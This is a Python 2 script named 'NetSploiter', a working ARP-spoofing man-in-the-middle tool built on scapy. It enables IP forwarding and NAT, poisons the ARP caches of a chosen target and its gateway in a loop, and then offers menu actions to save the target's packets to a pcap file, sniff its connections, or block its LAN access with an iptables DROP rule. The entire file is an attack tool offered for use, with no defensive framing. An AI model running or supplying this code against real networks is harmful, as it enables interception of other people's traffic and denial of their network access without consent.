#!/usr/bin/python

"""

 /$$   /$$             /$$      /$$$$$$            /$$           /$$   /$$
| $$$ | $$            | $$     /$$__  $$          | $$          |__/  | $$
| $$$$| $$  /$$$$$$  /$$$$$$  | $$  \__/  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$    /$$$$$$   /$$$$$$
| $$ $$ $$ /$$__  $$|_  $$_/  |  $$$$$$  /$$__  $$| $$ /$$__  $$| $$|_  $$_/   /$$__  $$ /$$__  $$
| $$  $$$$| $$$$$$$$  | $$     \____  $$| $$  \ $$| $$| $$  \ $$| $$  | $$    | $$$$$$$$| $$  \__/
| $$\  $$$| $$_____/  | $$ /$$ /$$  \ $$| $$  | $$| $$| $$  | $$| $$  | $$ /$$| $$_____/| $$
| $$ \  $$|  $$$$$$$  |  $$$$/|  $$$$$$/| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/|  $$$$$$$| $$
|__/  \__/ \_______/   \___/   \______/ | $$____/ |__/ \______/ |__/   \___/   \_______/|__/
                                        | $$
                                        | $$
                                        |__/

"""

import os
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A POSTROUTING -o wlp3s0 -j MASQUERADE")

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
import threading
import socket
import uuid
import time
import sys
import subprocess

def get_mac(ip_addr):
    mac_addr = ""
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout=2)

    for sent, received in answered:
        mac_addr = received.sprintf("%Ether.src%")
        break

    return mac_addr

def get_local_mac():
    local_mac = str(format(uuid.getnode(), 'x'))

    while len(local_mac) < 12:
	local_mac = "0" + local_mac

    mac_bytes = []
    separator = ":"
    start = 0
    end = 2

    while end <= len(local_mac):
        mac_bytes.append(local_mac[start:end])
        start += 2
        end +=2

    local_mac = separator.join(mac_bytes)

    return local_mac

def poison_target(target_ip, target_mac, gateway_ip, gateway_mac, local_mac):
    send(ARP(psrc=gateway_ip, hwsrc=local_mac, pdst=target_ip))
    send(ARP(psrc=target_ip, hwsrc=local_mac, pdst=gateway_ip))

    start = int(time.time())
    while True:
        end = int(time.time())

        if (end - start) == 3:
	    send(ARP(psrc=gateway_ip, hwsrc=local_mac, pdst=target_ip))
	    send(ARP(psrc=target_ip, hwsrc=local_mac, pdst=gateway_ip))
            start = end

def restore_target(gateway_ip, target_ip):
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    local_mac = get_local_mac()

    send(ARP(psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip))
    send(ARP(psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip))

def network_scan():
    up_hosts = []
    ans, unans = sr(IP(dst="192.168.1.1-20")/ICMP(), timeout=2)

    for s, r in ans:
        up_hosts.append(r.sprintf("%IP.src%"))

    return up_hosts

def show_packets(packet):
    try:
        wrpcap("stream.pcap", packet)
    except Exception:
        pass

def save_packets(packet):
    try:
        pcap_writer = PcapWriter("captures2.pcap", append=True, sync=True)
	pcap_writer.write(packet)
    except KeyboardInterrupt:
        sys.exit(0)

def sniff_connections(packet):
    try:
        if packet.haslayer(IP):
            print str(socket.gethostbyaddr(str(packet[IP].src))[0]) + " --> " + str(socket.gethostbyaddr(str(packet[IP].dst))[0])
    except socket.herror:
        pass
    except KeyboardInterrupt:
        sys.exit(0)

def main():
    #target_ip = sys.argv[1]

    try:
        conf.verb = 0
        #target_mac = get_mac(target_ip)
        #gateway_mac = get_mac("192.168.1.1")
	    #local_mac = get_local_mac()

        if sys.platform == "linux2":
            os.system("clear")

            print "\033[1;32m"
            print " /$$   /$$             /$$      /$$$$$$            /$$           /$$   /$$                        "
            print "| $$$ | $$            | $$     /$$__  $$          | $$          |__/  | $$                        "
            print "| $$$$| $$  /$$$$$$  /$$$$$$  | $$  \__/  /$$$$$$ | $$  /$$$$$$  /$$ /$$$$$$    /$$$$$$   /$$$$$$ "
            print "| $$ $$ $$ /$$__  $$|_  $$_/  |  $$$$$$  /$$__  $$| $$ /$$__  $$| $$|_  $$_/   /$$__  $$ /$$__  $$"
            print "| $$  $$$$| $$$$$$$$  | $$     \____  $$| $$  \ $$| $$| $$  \ $$| $$  | $$    | $$$$$$$$| $$  \__/"
            print "| $$\  $$$| $$_____/  | $$ /$$ /$$  \ $$| $$  | $$| $$| $$  | $$| $$  | $$ /$$| $$_____/| $$      "
            print "| $$ \  $$|  $$$$$$$  |  $$$$/|  $$$$$$/| $$$$$$$/| $$|  $$$$$$/| $$  |  $$$$/|  $$$$$$$| $$      "
            print "|__/  \__/ \_______/   \___/   \______/ | $$____/ |__/ \______/ |__/   \___/   \_______/|__/      "
            print "                                        | $$                                                      "
            print "                                        | $$                                                      "
            print "                                        |__/                                                      "
            print "\033[0m"

        try:
            target_ip = raw_input("Target's IP: ")
            target_mac = get_mac(target_ip)
	    default_gateway = subprocess.check_output("route -n | cut -c 17- | grep wlp3s0 | cut -c -16 | tr '\n' '\t' | cut -f 1", shell=True).rstrip()
            gateway_ip = raw_input("Gateway's IP [default: %s]: " % (default_gateway))
            if gateway_ip == "":
                gateway_ip = default_gateway

            gateway_mac = get_mac(gateway_ip)
            local_mac = get_local_mac()

        except ValueError:
            if sys.platform == "linux2":
                print "[\033[1;31m!\033[0m] Error"
            else:
                print "[!] Error"
            sys.exit(-1)

        poison_thread = threading.Thread(target=poison_target, args=(target_ip, target_mac, gateway_ip, gateway_mac, local_mac))
        poison_thread.start()
    	#poison_target(target_ip, target_mac, gateway_mac, local_mac)

        if sys.platform == "linux2":
            print "[\033[1;32m*\033[0m] ARP cache of %s (%s) at %s has been poisoned" % (socket.gethostbyaddr(target_ip)[0], target_mac, target_ip)
        else:
            print "[*] ARP cache of %s (%s) at %s has been poisoned" % (socket.gethostbyaddr(target_ip)[0], target_mac, target_ip)

        while True:
            try:
                print "Actions:"
                print "  1. Save packets in a .pcap file"
                print "  2. Redirect target's HTTP/HTTPS requests"
                print "  3. Kick target from LAN"
                print "  4. Sniff established connections"
                print "  5. Exit"

                action = input("Action: ")

                if action == 1:
                    print "[\033[1;32m*\033[0m] Saving packets sniffed from and to %s (%s)..." % (str(socket.gethostbyaddr(target_ip)[0]), target_ip)
                    sniff(prn=save_packets, filter="ip host %s" % (target_ip), store=0)

                elif action == 2:
                    print "Unavailable"

                elif action == 3:
                    try:
                        os.system("iptables -A FORWARD -d %s -j DROP" % (target_ip))

                        if sys.platform == "linux2":
                            print "[\033[1;32m*\033[0m] %s (%s) has been kicked from local network" % (str(socket.gethostbyaddr(target_ip)[0]), target_ip)
                        else:
                            print "[*] %s (%s) has been kicked from local network" % (str(socket.gethostbyaddr(target_ip)[0]), target_ip)

        		while True:
                            pass
                    except KeyboardInterrupt:
                        os.system("iptables -F FORWARD")
                        print "\n[\033[1;32m*\033[0m] LAN access of %s (%s) has been restored" % (str(socket.gethostbyaddr(target_ip)[0]), target_ip)

                elif action == 4:
                    sniff(prn=sniff_connections, filter="ip host %s" % (target_ip), store=0)

                elif action == 5:
                    restore_target(gateway_ip, target_ip)
                    print "[\033[1;32m*\033[0m] ARP cache of %s (%s) at %s has been restored" % (socket.gethostbyaddr(target_ip)[0], target_mac, target_ip)
                    break

                else:
                    print "[\033[1;31m!\033[0m] \033[1;0mUnavailable option\033[0m"

            except ValueError:
                if sys.platform == "linux2":
                    print "[\033[1;31m!\033[0m] \033[1;0mError\033[0m"
                else:
                    print "[!] Error"
                sys.exit(-1)

        os.system("iptables -t nat -D POSTROUTING -o wlp3s0 -j MASQUERADE")
        os.system("kill %s" % (str(os.getpid())))

    except KeyboardInterrupt:
        restore_target(gateway_ip, target_ip)
        print "[\033[1;32m*\033[0m] ARP cache of %s (%s) at %s has been restored" % (socket.gethostbyaddr(target_ip)[0], target_mac, target_ip)
        os.system("iptables -t nat -D POSTROUTING -o wlan0 -j MASQUERADE")
	os.system("kill %s" % (str(os.getpid())))

main()
